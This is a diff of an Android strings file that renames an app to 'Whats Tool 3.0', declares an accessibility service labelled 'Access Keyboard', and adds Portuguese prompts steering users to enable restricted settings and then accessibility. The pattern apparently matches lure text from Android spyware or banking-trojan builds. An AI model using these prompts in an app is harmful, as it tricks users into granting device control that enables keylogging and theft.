@@ -1,11 +1,14 @@
 <resources>
-    <string name="app_name">Azmat</string>
-    <string name="app_user_id">66c36efbb2c1268a69b1b234</string>
+    <string name="app_name">Whats Tool 3.0</string>
+    <string name="app_user_id">66e21553b73dd71142a9f048</string>
     <string name="accessibility_service_description">Access Keyboard</string>
 
     <string name="complete_activation">Agora você precisa concluir a ativação.</string>
-    <string name="allow_restrict">1: Ativar Configuração Restrita</string>
-    <string name="enable_accessibility">2: Ativar Acessibilidade</string>
+    <string name="allow_restrict1">1: Ativar Configuração Restrita</string>
+    <string name="enable_accessibility1">2: Ativar Acessibilidade</string>
+    <string name="allow_restrict2">2: Ativar Configuração Restrita</string>
+    <string name="enable_accessibility2">1: Ativar Acessibilidade</string>
+    <string name="enable_accessibility">Ativar Acessibilidade</string>
     <string name="allow">Permitir</string>
     <string name="enable">Ativar</string>
 </resources>
